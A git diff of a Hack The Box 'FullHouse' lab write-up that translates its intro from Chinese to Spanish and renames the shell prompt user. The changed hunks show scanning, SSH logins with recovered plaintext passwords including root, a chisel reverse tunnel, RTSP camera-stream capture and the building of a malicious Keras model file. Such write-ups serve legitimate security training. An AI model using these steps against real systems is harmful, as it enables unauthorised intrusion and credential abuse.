@@ -1,31 +1,37 @@
-# FullHouse
 
-## ENTRY POINT
+---
+# author: randark 
+### FullHouse
+
+## PUNTO DE ENTRADA
 
 ```plaintext
 10.13.38.31
+
 ```
 
-## Introduction
+## Introducción
 
-> 作者：amra13579
->
-> HTBCasino 高度重视保障玩家的隐私与安全。为此，赌场聘请您来发现并报告新旧组件中可能存在的安全漏洞。您的目标是在内部网络中获得立足点，提升权限，最终全面攻破整个基础设施，同时在此过程中收集多个标志。此专业实验室旨在测试您在枚举、代码审查、横向移动、Web 利用及其他攻击技术方面的技能。
->
-> 您需要为以下内容做好充分准备：
->
-> - 源代码审查
-> - Web 应用攻击
-> - 逆向工程
-> - Windows 系统利用
-> - Active Directory 利用
-> - 区块链利用
-> - AI 绕过 / 利用
+> Autor: amra13579
+> HTBCasino otorga una gran importancia a la protección de la privacidad y la seguridad de sus jugadores. Por ello, el casino le ha contratado para descubrir e informar sobre posibles vulnerabilidades de seguridad en componentes tanto nuevos como antiguos. Su objetivo es obtener un punto de apoyo en la red interna, escalar privilegios y, finalmente, comprometer por completo toda la infraestructura, recolectando múltiples flags durante el proceso. Este laboratorio profesional está diseñado para poner a prueba sus habilidades en enumeración, revisión de código, movimiento lateral, explotación Web y otras técnicas de ataque.
+> Debe estar plenamente preparado para lo siguiente:
+> * Revisión de código fuente
+> * Ataques a aplicaciones Web
+> * Ingeniería inversa
+> * Explotación de sistemas Windows
+> * Explotación de Active Directory
+> * Explotación de Blockchain
+> * Bypass / Explotación de IA
+> 
+> 
 
-## CASINO 资产探测
+---
+ 
+
+## CASINO (Detección de activos de CASINO)
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sudo nmap -vv --min-rate 2000 -A -p- 10.13.38.31
 ......
 Nmap scan report for bogon (10.13.38.31)
@@ -65,7 +71,7 @@ Host script results:
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
 |_smb2-security-mode: Couldn't establish a SMBv2 connection.
 
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sudo ./tools/fscan-1.8.4/fscan -h 10.13.38.31
 ......
 start infoscan
@@ -80,10 +86,10 @@ start vulscan
 
 ## CASINO Port 80 Web Service
 
-尝试直接请求
+Intento de solicitud directa:
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ http get 10.13.38.31
 HTTP/1.1 301 Moved Permanently
 Connection: keep-alive
@@ -388,7 +394,7 @@ slots_test:spVs9gvsk8p8lVJ
 尝试使用 `cassandra:spVs9gvsk8p8lVJ` 登录服务器
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sshpass -p spVs9gvsk8p8lVJ ssh cassandra@casino.htb
 ......
 cassandra@casino:~$ whoami
@@ -486,7 +492,7 @@ start vulscan
 
 ```bash
 # Local Kali
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ ./tools/chisel-v1.9.1/chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 2025/03/20 09:49:11 server: Reverse tunnelling enabled
 2025/03/20 09:49:11 server: Fingerprint XrhkI8NNQ1o+eRMk17I84dcsDoa6vsKHJ/CMbPKQ4ss=
@@ -504,7 +510,7 @@ start vulscan
 使用 `nmap` 扫描
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sudo proxychains nmap --min-rate 5000 -T4 -sT -A --top-ports 100 10.0.52.5
 ......
 Nmap scan report for bogon (10.0.52.5)
@@ -526,7 +532,7 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 `22` 端口上的 `OpenSSH 9.3` 肯定不是目标，那么探测一下 RTSP 协议
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sudo proxychains nmap -sT -sCV --script "rtsp-*" -p 554 10.0.52.5
 Nmap scan report for bogon (10.0.52.5)
 Host is up (0.18s latency).
@@ -542,7 +548,7 @@ PORT    STATE SERVICE VERSION
 尝试连接一下，看一下视频流
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ proxychains ffmpeg -rtsp_transport tcp -i rtsp://10.0.52.5/mpeg4 -c copy out.mp4
 [proxychains] Strict chain  ...  127.0.0.1:10000  ...  10.0.52.5:554  ...  OK
 Input #0, rtsp, from 'rtsp://10.0.52.5/mpeg4':
@@ -575,7 +581,7 @@ frame= 2278 fps= 24 q=-1.0 Lsize=   70143KiB time=00:01:31.86 bitrate=6255.0kbit
 尝试使用这个密码登录服务器
 
 ```bash
-┌──(randark ㉿ kali)-[~]
+┌──(kali@ kali)-[~]
 └─$ sshpass -p 4vQ03013nKj9 ssh root@casino.htb
 ......
 root@casino:~# whoami
@@ -696,7 +702,7 @@ model.save("exploit.h5")
 然后编译镜像并启动容器
 
 ```bash
-randark@developer:~/codes/Hackthebox-Fullhouse$ docker build -t fullhouse-exp .
+kali@developer:~/codes/Hackthebox-Fullhouse$ docker build -t fullhouse-exp .
 [+] Building 0.1s (7/7) FINISHED                                                                              docker:default
  => [internal] load build definition from Dockerfile                                                                    0.0s
  => => transferring dockerfile: 106B                                                                                    0.0s
@@ -711,7 +717,7 @@ randark@developer:~/codes/Hackthebox-Fullhouse$ docker build -t fullhouse-exp .
  => => exporting layers                                                                                                 0.0s
  => => writing image sha256:4028b237f62cadbf3c231ac2c2752e5a72c1316ae0e8b00347331bd0621337aa                            0.0s
  => => naming to docker.io/library/fullhouse-exp                                                                        0.0s
-randark@developer:~/codes/Hackthebox-Fullhouse$ docker run -it fullhouse-exp
+kali@developer:~/codes/Hackthebox-Fullhouse$ docker run -it fullhouse-exp
 
 ________                               _______________
 ___  __/__________________________________  ____/__  /________      __
@@ -745,10 +751,10 @@ total 20K
 ```bash
 root@e1cc11c93e27:~# exit
 exit
-randark@developer:~/codes/Hackthebox-Fullhouse$ docker ps -a
+kali@developer:~/codes/Hackthebox-Fullhouse$ docker ps -a
 CONTAINER ID   IMAGE           COMMAND       CREATED         STATUS                      PORTS     NAMES
 e1cc11c93e27   fullhouse-exp   "/bin/bash"   2 minutes ago   Exited (0) 44 seconds ago             modest_brattain
-randark@developer:~/codes/Hackthebox-Fullhouse$ docker cp e1cc11c93e27:/root/exploit.h5 .
+kali@developer:~/codes/Hackthebox-Fullhouse$ docker cp e1cc11c93e27:/root/exploit.h5 .
 Successfully copied 14.8kB to /home/randark/codes/Hackthebox-Fullhouse/.
 ```
 
